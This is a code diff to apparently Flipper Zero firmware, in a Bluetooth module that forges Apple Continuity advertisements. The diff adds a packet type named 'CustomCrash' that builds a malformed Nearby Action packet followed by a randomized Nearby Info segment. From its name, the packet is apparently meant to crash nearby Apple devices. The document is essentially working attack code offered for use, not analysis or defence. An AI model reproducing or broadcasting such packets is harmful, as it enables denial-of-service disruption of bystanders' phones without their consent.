@@ -1,5 +1,6 @@
 #include "continuity.h"
 #include <furi_hal_random.h>
+#include <core/core_defines.h>
 
 // Hacked together by @Willy-JL
 // Custom adv logic by @Willy-JL (idea by @xMasterX)
@@ -16,6 +17,7 @@ static const char* continuity_type_names[ContinuityTypeCount] = {
     [ContinuityTypeTetheringSource] = "Tethering Source",
     [ContinuityTypeNearbyAction] = "Nearby Action",
     [ContinuityTypeNearbyInfo] = "Nearby Info",
+    [ContinuityTypeCustomCrash] = "Custom Packet",
 };
 const char* continuity_get_type_name(ContinuityType type) {
     return continuity_type_names[type];
@@ -30,6 +32,7 @@ static uint8_t continuity_packet_sizes[ContinuityTypeCount] = {
     [ContinuityTypeTetheringSource] = HEADER_LEN + 6,
     [ContinuityTypeNearbyAction] = HEADER_LEN + 5,
     [ContinuityTypeNearbyInfo] = HEADER_LEN + 5,
+    [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
 };
 uint8_t continuity_get_packet_size(ContinuityType type) {
     return continuity_packet_sizes[type];
@@ -133,6 +136,25 @@ void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
         packet[i++] = (rand() % 256); // Authentication Tag
         packet[i++] = (rand() % 256); // ...
         packet[i++] = (rand() % 256); // ...
+        break;
+
+    case ContinuityTypeCustomCrash:
+        i -= 2; // Override segment header
+
+        packet[i++] = ContinuityTypeNearbyAction; // Type
+        packet[i++] = 0x05; // Length
+        packet[i++] = 0xC1; // Action Flags
+        const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
+        packet[i++] = types[rand() % COUNT_OF(types)]; // Action Type
+        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
+        i += 3;
+
+        packet[i++] = 0x00; // ???
+        packet[i++] = 0x00; // ???
+
+        packet[i++] = ContinuityTypeNearbyInfo; // Type ???
+        furi_hal_random_fill_buf(&packet[i], 3); // Shenanigans (Length + IDK) ???
+        i += 3;
         break;
 
     default:
